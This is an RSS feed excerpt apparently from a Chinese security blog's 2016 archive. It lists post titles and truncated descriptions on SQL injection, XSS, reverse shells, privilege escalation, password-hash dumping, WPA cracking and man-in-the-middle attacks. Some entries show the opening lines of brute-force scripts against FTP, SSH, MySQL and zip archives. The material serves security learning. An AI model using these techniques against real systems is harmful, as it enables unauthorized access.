      <title>[转] JS 操作 cookie 方法的封装</title>
      <link>https://wyb0.com/posts/2016/js-package-cookie-function/</link>
      <pubDate>Tue, 27 Dec 2016 11:49:38 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/js-package-cookie-function/</guid>
      <description>原文链接：http://www.wyzu.cn/2015/0123/107167.html 0x00 实现功能 添加cookie 获取</description>
    </item>
    
    <item>
      <title>Python 实现 CDN 的判断</title>
      <link>https://wyb0.com/posts/2016/cdn-detection/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/cdn-detection/</guid>
      <description>0x00 什么是CDN CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容， 运营商会在全国</description>
    </item>
    
    <item>
      <title>AJAX 与 PHP</title>
      <link>https://wyb0.com/posts/2016/ajax-and-php/</link>
      <pubDate>Wed, 16 Nov 2016 10:37:03 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ajax-and-php/</guid>
      <description>0x00 AJAX与PHP ajax.html代码如下： &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt; &amp;lt;script&amp;gt; function showHint(str) { var xmlhttp; if (str.length==0) { document.getElementById(&amp;#34;txtHint&amp;#34;).innerHTML=&amp;#34;&amp;#34;; return; } if (window.XMLHttpRequest) { // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码 xmlhttp=new XMLHttpRequest(); /</description>
    </item>
    
    <item>
      <title>[转] MySQL 报错注入原理分析(count()、rand()、group by)</title>
      <link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
      <description>原文链接：http://drops.wooyun.org/tips/14312 0x00 疑问 一直在用mysql数据库报错注入方法</description>
    </item>
    
    <item>
      <title>Nessus 的安装和卸载</title>
      <link>https://wyb0.com/posts/2016/nessus-install-and-remove/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/nessus-install-and-remove/</guid>
      <description>0x00 下载 Nessus 的 deb 安装包 去【这里】，选择家庭版，然后下载对应的安装包 0x01 本地安装 Nessus 0x02 执行后续安装步骤: 启动nessus web访问</description>
    </item>
    
    <item>
      <title>AJAX 的 XHR 请求与响应</title>
      <link>https://wyb0.com/posts/2016/ajax-request-and-response/</link>
      <pubDate>Tue, 25 Oct 2016 00:53:13 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ajax-request-and-response/</guid>
      <description>0x00 什么是AJAX AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML AJAX不是新的编</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，</description>
    </item>
    
    <item>
      <title>代码执行漏洞(二)</title>
      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
      <description>接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可</description>
    </item>
    
    <item>
      <title>准则</title>
      <link>https://wyb0.com/posts/2016/principles/</link>
      <pubDate>Wed, 21 Sep 2016 23:05:57 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/principles/</guid>
      <description>0x00 创造价值 小鸡问母鸡：可否不用下蛋，带我出去玩啊？母鸡道：不行，我要工作！ 小鸡说：可你已经下了这么多蛋了！母鸡意味深长地</description>
    </item>
    
    <item>
      <title>SqlmapApi 常用方法封装</title>
      <link>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</guid>
      <description>0x00 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import threading import requests import json from time import sleep class Sqli(threading.Thread): &amp;#34;&amp;#34;&amp;#34;docstring for AutoSqli&amp;#34;&amp;#34;&amp;#34; def __init__(self, server, target, data=&amp;#39;&amp;#39;, referer=&amp;#39;&amp;#39;, cookie=&amp;#39;&amp;#39;): threading.Thread.__init__(self) self.server = server[0:-1] if server[-1]==&amp;#39;/&amp;#39; else server self.target = target self.data = data self.referer = referer self.cookie = cookie self.taskid = &amp;#39;&amp;#39; self.data def new_task(self):</description>
    </item>
    
    <item>
      <title>Python 爆破 zip 压缩包</title>
      <link>https://wyb0.com/posts/2016/python-blasting-zip-archive/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-blasting-zip-archive/</guid>
      <description>0x00 代码 多线程爆破加密的zip压缩包 #!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &amp;#39;&amp;#39; def load_pwd(filename): for line in open(filename,&amp;#39;r&amp;#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while</description>
    </item>
    
    <item>
      <title>Python 实现代理</title>
      <link>https://wyb0.com/posts/2016/python-implement-agent/</link>
      <pubDate>Tue, 13 Sep 2016 11:36:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-implement-agent/</guid>
      <description>0x00 帮助信息 0x01 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- &amp;#39;This is a proxy&amp;#39; __author__ = &amp;#39;xxx&amp;#39; import sys import socket import threading import optparse lock = threading.Lock() def locker(msg): lock.acquire() print msg lock.release() def hexdump (src,length=16):#</description>
    </item>
    
    <item>
      <title>Python 封装 MySQL 类</title>
      <link>https://wyb0.com/posts/2016/python-package-mysql-function/</link>
      <pubDate>Mon, 12 Sep 2016 22:54:28 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-package-mysql-function/</guid>
      <description>0x00 安装 有两种，一个是MySQLdb，一个是pymysql 下载MySQL-python然后安装 sudo pip install pymysql(推荐，</description>
    </item>
    
    <item>
      <title>Tmux 的使用</title>
      <link>https://wyb0.com/posts/2016/tmux-usage/</link>
      <pubDate>Sat, 10 Sep 2016 16:24:18 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/tmux-usage/</guid>
      <description>0x00 Tmux 的快捷键前缀 在 Tmux 下想要使用快捷键时，需要先按下快捷键前缀，然后再按下快捷键。 默认情况下，Tmux 的快捷键前缀是 Ctr</description>
    </item>
    
    <item>
      <title>POC 框架 Pocsuite</title>
      <link>https://wyb0.com/posts/2016/poc-framework-pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/poc-framework-pocsuite/</guid>
      <description>0x00 关于Pocsuite Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只</description>
    </item>
    
    <item>
      <title>Sublime Text 3 几个好用的插件</title>
      <link>https://wyb0.com/posts/2016/sublime-text3-plugins/</link>
      <pubDate>Fri, 02 Sep 2016 23:07:44 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/sublime-text3-plugins/</guid>
      <description>0x00 Package Control 安装完这个插件后可以更容易的管理(安装、删除、查看等)其他插件 代码安装 ctrl+~快捷键调出console，将下面</description>
    </item>
    
    <item>
      <title>PHP 安全配置</title>
      <link>https://wyb0.com/posts/2016/php-safe-configuration/</link>
      <pubDate>Thu, 01 Sep 2016 08:46:03 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-safe-configuration/</guid>
      <description>0x00 PHP的配置 PHP的配置文件为php.ini,其中有些项配置不当的话就会造成一些安全问题 0x01 远程文件包含 涉及配置项 allow_url_include 配置</description>
    </item>
    
    <item>
      <title>Python 的模块</title>
      <link>https://wyb0.com/posts/2016/python-module/</link>
      <pubDate>Wed, 31 Aug 2016 11:22:41 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-module/</guid>
      <description>0x00 Python的模块 在python中，任何一个python文件都可以看作一个模块 不同包下有相同模块名并不会冲突，且包下必</description>
    </item>
    
    <item>
      <title>Python 实现密码生成器</title>
      <link>https://wyb0.com/posts/2016/python-password-generator/</link>
      <pubDate>Mon, 29 Aug 2016 15:14:57 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-password-generator/</guid>
      <description>0x00 简介 有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则</description>
    </item>
    
    <item>
      <title>Python 实现多线程弱口令爆破</title>
      <link>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid>
      <description>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &amp;#39;this script can bruter ftp/ssh/mysql&amp;#39; __author__ = &amp;#39;reber&amp;#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类</description>
    </item>
    
    <item>
      <title>Metasploit 利用 workspace 进行批量扫描爆破</title>
      <link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的</description>
    </item>
    
    <item>
      <title>Ubuntu 下安装 Metasploit</title>
      <link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
      <description>0x00 安装Metasploit 下载msfinstall脚本 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall 修改文件权限 $ chmod 755 msfinstall 安装(可能时间较久) $ ./msfinstall 更新exp $</description>
    </item>
    
    <item>
      <title>Python 命令行参数解析</title>
      <link>https://wyb0.com/posts/2016/python-parames-parse/</link>
      <pubDate>Tue, 16 Aug 2016 15:10:44 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-parames-parse/</guid>
      <description>0x00 argparse 模块 参考 https://docs.python.org/zh-cn/3.7/library/argparse.html #!/usr/bin/env python # -*- coding: utf-8 -*- import argparse class Parser(object): &amp;#34;&amp;#34;&amp;#34;Parser&amp;#34;&amp;#34;&amp;#34; def __init__(self): super(Parser, self).__init__() self.service_type_list = [ &amp;#34;ssh&amp;#34;,&amp;#34;telnet&amp;#34;,&amp;#34;ftp&amp;#34;, &amp;#34;mysql&amp;#34;,&amp;#34;mssql&amp;#34;,&amp;#34;oracle&amp;#34;,&amp;#34;pgsql&amp;#34;,&amp;#34;redis&amp;#34; ] self.log_level = [&amp;#34;debug&amp;#34;, &amp;#34;info&amp;#34;, &amp;#34;warning&amp;#34;, &amp;#34;error&amp;#34;, &amp;#34;critical&amp;#34;] self.example = &amp;#34;&amp;#34;&amp;#34;Example: \r python3 {} -s ssh -i 123.123.123.123 \r python3 {} -s ssh -i 123.123.123.123/24 -l root -p 123456&amp;#34;&amp;#34;&amp;#34; def parser(self): parser</description>
    </item>
    
    <item>
      <title>BurpSuite 抓手机包</title>
      <link>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</guid>
      <description>0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包 挂burpsu</description>
    </item>
    
    <item>
      <title>Linux 下虚拟主机搭建多站点</title>
      <link>https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/</link>
      <pubDate>Fri, 12 Aug 2016 08:39:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/</guid>
      <description>环境：CentOS-6.5-x86_64-minimal 0x00 搭建LAMP 安装Apache yum install httpd 安装MySQL yum install mysql mysql-server 设置数</description>
    </item>
    
    <item>
      <title>Python 的 scapy 模块简单使用</title>
      <link>https://wyb0.com/posts/2016/python-module-scapy/</link>
      <pubDate>Thu, 11 Aug 2016 23:26:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-module-scapy/</guid>
      <description>0x00 简单尝试 0x01 生成一组数据包 0x02 发送数据包 send发送数据包 sr1发送数据包 sr发送数据包 0x03 发送SYN数据包 0x04 得到TCP内容</description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</guid>
      <description>Web常见漏洞</description>
    </item>
    
    <item>
      <title>SSH 免密登录及 SSH 隧道</title>
      <link>https://wyb0.com/posts/2016/linux-ssh-connect/</link>
      <pubDate>Wed, 10 Aug 2016 11:46:13 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-ssh-connect/</guid>
      <description>0x00 SSH相关选项 -V 显示版本 -f 输入密码后进入后台模式 -N 不执行远程命令，一般与-f连用，用于端口转发 -C 压缩传输的数据，网速快</description>
    </item>
    
    <item>
      <title>Linux 下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤： 1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反</description>
    </item>
    
    <item>
      <title>端口转发</title>
      <link>https://wyb0.com/posts/2016/port-forwarding/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/port-forwarding/</guid>
      <description>0x00 应用场景 内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也</description>
    </item>
    
    <item>
      <title>导出 Windows 主机密码与开启 3389</title>
      <link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash 关于Windows的hash 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提</description>
    </item>
    
    <item>
      <title>Windows 下第三方服务提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
      <description>0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权 提权条件：数据库账</description>
    </item>
    
    <item>
      <title>Windows 下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>提权是在已经getshell但是权限不大的前提下做的 0x00 查看基本信息 0x01 使用cmd执行命令 尝试使用cmd执行命令 找可写目录 尝</description>
    </item>
    
    <item>
      <title>反弹 shell 小结</title>
      <link>https://wyb0.com/posts/2016/reverse-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/reverse-shell/</guid>
      <description>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一</description>
    </item>
    
    <item>
      <title>Dedecms 远程写文件漏洞</title>
      <link>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</guid>
      <description>0x00 关于漏洞 Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞 0x01 利用条件 de</description>
    </item>
    
    <item>
      <title>Redis 未授权访问漏洞</title>
      <link>https://wyb0.com/posts/2016/redis-unauthorized-access/</link>
      <pubDate>Thu, 04 Aug 2016 15:52:26 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/redis-unauthorized-access/</guid>
      <description>0x00 Redis的未授权访问 若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。 若Redis以root</description>
    </item>
    
    <item>
      <title>一次存储型 XSS 利用实例</title>
      <link>https://wyb0.com/posts/2016/redis-bisis-use/</link>
      <pubDate>Wed, 03 Aug 2016 11:02:20 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/redis-bisis-use/</guid>
      <description>0x00 关于Redis Redis和MySQL这种关系型数据库不一样，它是非关系型数据库，是日志型、Key-Value数据库， 实</description>
    </item>
    
    <item>
      <title>Tomcat 部署 War 包 getshell</title>
      <link>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于 War 包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Ja</description>
    </item>
    
    <item>
      <title>CGI 与 FastCGI 与 PHP-FPM</title>
      <link>https://wyb0.com/posts/2016/cgi-and-fastcgi-and-php-fpm/</link>
      <pubDate>Tue, 02 Aug 2016 10:45:14 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/cgi-and-fastcgi-and-php-fpm/</guid>
      <description>0x01 CGI协议 中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数</description>
    </item>
    
    <item>
      <title>BurpSuite 的 Intruder 模块</title>
      <link>https://wyb0.com/posts/2016/burpsuite-intruder-module/</link>
      <pubDate>Mon, 01 Aug 2016 09:17:38 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/burpsuite-intruder-module/</guid>
      <description>0x00 示例一 0x01 示例二</description>
    </item>
    
    <item>
      <title>逻辑漏洞</title>
      <link>https://wyb0.com/posts/2016/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/logical-loophole/</guid>
      <description>0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。 0x01 密</description>
    </item>
    
    <item>
      <title>敏感信息泄露</title>
      <link>https://wyb0.com/posts/2016/sensitive-information-leakage/</link>
      <pubDate>Thu, 28 Jul 2016 22:42:58 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/sensitive-information-leakage/</guid>
      <description>0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatwe</description>
    </item>
    
    <item>
      <title>任意文件查看与下载漏洞</title>
      <link>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</link>
      <pubDate>Wed, 27 Jul 2016 23:25:18 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</guid>
      <description>0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够</description>
    </item>
    
    <item>
      <title>文件包含漏洞</title>
      <link>https://wyb0.com/posts/2016/file-include-vulnerabilities/</link>
      <pubDate>Tue, 26 Jul 2016 09:24:22 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-include-vulnerabilities/</guid>
      <description>环境：phpStudy 2016、DVWA v1.10 0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时</description>
    </item>
    
    <item>
      <title>代码执行漏洞(一)</title>
      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
      <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造</description>
    </item>
    
    <item>
      <title>Windows 下用 Proxifier 实现全局代理</title>
      <link>https://wyb0.com/posts/2016/windows-proxifier-implement-global-proxy/</link>
      <pubDate>Sun, 24 Jul 2016 21:33:59 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-proxifier-implement-global-proxy/</guid>
      <description>0x00 环境 在windows下用Shadowsocks和Proxifier实现全局代理： System：Windows10 Pro x64 S</description>
    </item>
    
    <item>
      <title>命令执行漏洞</title>
      <link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
      <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passth</description>
    </item>
    
    <item>
      <title>文件上传漏洞常见绕过手法</title>
      <link>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</guid>
      <description>0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端</description>
    </item>
    
    <item>
      <title>文件上传漏洞与文件解析漏洞</title>
      <link>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</guid>
      <description>0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控</description>
    </item>
    
    <item>
      <title>虚拟机下安装 vm-tools</title>
      <link>https://wyb0.com/posts/2016/vmware-install-vm-tools/</link>
      <pubDate>Wed, 20 Jul 2016 08:30:53 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/vmware-install-vm-tools/</guid>
      <description>vm-tools安装后可以在客户机和虚拟机间双向复制文件 0x00 安装 0x01 Kali2.0 一般安装的话按照上面的步骤即可安装成功，但是Kali2</description>
    </item>
    
    <item>
      <title>一次存储型 XSS 利用实例</title>
      <link>https://wyb0.com/posts/2016/recording-an-stored-xss/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/recording-an-stored-xss/</guid>
      <description>首先感谢凯神的指导 0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的</description>
    </item>
    
    <item>
      <title>XSS 漏洞及其挖掘方法</title>
      <link>https://wyb0.com/posts/2016/xss-basis-and-use/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/xss-basis-and-use/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器</description>
    </item>
    
    <item>
      <title>Python 的 paramiko 模块</title>
      <link>https://wyb0.com/posts/2016/python-module-paramiko/</link>
      <pubDate>Thu, 14 Jul 2016 15:24:11 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-module-paramiko/</guid>
      <description>0x00 安装 直接pip install paramiko安装 或者去http://www.paramiko.org/ 下载 0x01 执行一条远程命令 #!/usr/bin/env python #-*-</description>
    </item>
    
    <item>
      <title>Python 的 cmd 模块</title>
      <link>https://wyb0.com/posts/2016/python-module-cmd/</link>
      <pubDate>Thu, 14 Jul 2016 09:44:06 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-module-cmd/</guid>
      <description>0x00 关于cmd模块 使用cmd模块创建的命令行解释器可以循环读取输入的所有行并且解析它们 0x01 cmd模块的一些常用方法： cmdl</description>
    </item>
    
    <item>
      <title>无线下 ettercap 做中间人攻击</title>
      <link>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link>
      <pubDate>Wed, 13 Jul 2016 09:22:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid>
      <description>前提：攻击主机和被攻击主机在一个无线下面 0x00 打开ettercap 0x01 查看host列表 在软件的图形化界面点击sniff，选择u</description>
    </item>
    
    <item>
      <title>攻击 WPA 保护下的 802.11 网络</title>
      <link>https://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</link>
      <pubDate>Wed, 13 Jul 2016 08:18:59 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</guid>
      <description>0x00 网络拓扑及信息 其中 ip 等信息如下： 0x01 获取信息 查看无线网卡并将其设置为监听模式 打开 kismet，进行基本设置 选择名字为 111111 的</description>
    </item>
    
    <item>
      <title>Windows2003 下搭建 VPN</title>
      <link>https://wyb0.com/posts/2016/windows2003-set-up-vpn/</link>
      <pubDate>Thu, 07 Jul 2016 10:39:50 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows2003-set-up-vpn/</guid>
      <description>0x00 环境及要求 Windows2003下搭建基于PPTP(点对点隧道协议)的VPN服务器 0x01 安装服务 0x02 配置并启用路由和远程访问</description>
    </item>
    
    <item>
      <title>iptables 简单配置 DMZ</title>
      <link>https://wyb0.com/posts/2016/iptables-configure-dmz/</link>
      <pubDate>Tue, 05 Jul 2016 09:56:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/iptables-configure-dmz/</guid>
      <description>0x00 要求 内网可以访问外网 内网可以访问DMZ区 外网不能访问内网 外网能访问DMZ区的服务 DMZ区不能访问内网 DMZ区不能主动访</description>
    </item>
    
    <item>
      <title>Python 简单解码 IP 头</title>
      <link>https://wyb0.com/posts/2016/python-simple-decode-ip-head/</link>
      <pubDate>Sun, 03 Jul 2016 20:06:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-simple-decode-ip-head/</guid>
      <description>0x00 解码IP头 Windows上运行时要以管理员身份运行 代码可以解码IP头统计通信信息并保存到文本，同时统计数量 #!/usr/bin/env python #-*- coding:utf-8 -*- import</description>
    </item>
    
    <item>
      <title>SSRF</title>
      <link>https://wyb0.com/posts/2016/ssrf/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ssrf/</guid>
      <description>0x00 什么是SSRF SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发</description>
    </item>
    
    <item>
      <title>Python 的编码问题</title>
      <link>https://wyb0.com/posts/2016/python-encode-setting/</link>
      <pubDate>Wed, 29 Jun 2016 15:14:11 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-encode-setting/</guid>
      <description>0x00 几个编码函数 * ord(x) 将字符转换为10进制整数(0~255之间) #ord(&amp;#39;a&amp;#39;)==&amp;gt;97 * chr(x) 将10进制整数(0~255之间)转换为字符 #chr(9</description>
    </item>
    
    <item>
      <title>sqlmapapi 的简单使用</title>
      <link>https://wyb0.com/posts/2016/sqlmapapi-usage/</link>
      <pubDate>Tue, 28 Jun 2016 11:19:11 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/sqlmapapi-usage/</guid>
      <description>0x00 关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量</description>
    </item>
    
    <item>
      <title>CSRF 漏洞</title>
      <link>https://wyb0.com/posts/2016/csrf/</link>
      <pubDate>Tue, 28 Jun 2016 09:21:34 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/csrf/</guid>
      <description>0x00 概念 当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，</description>
    </item>
    
    <item>
      <title>SQL 注入之防御</title>
      <link>https://wyb0.com/posts/2016/injection-of-defense/</link>
      <pubDate>Sat, 25 Jun 2016 10:25:11 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-defense/</guid>
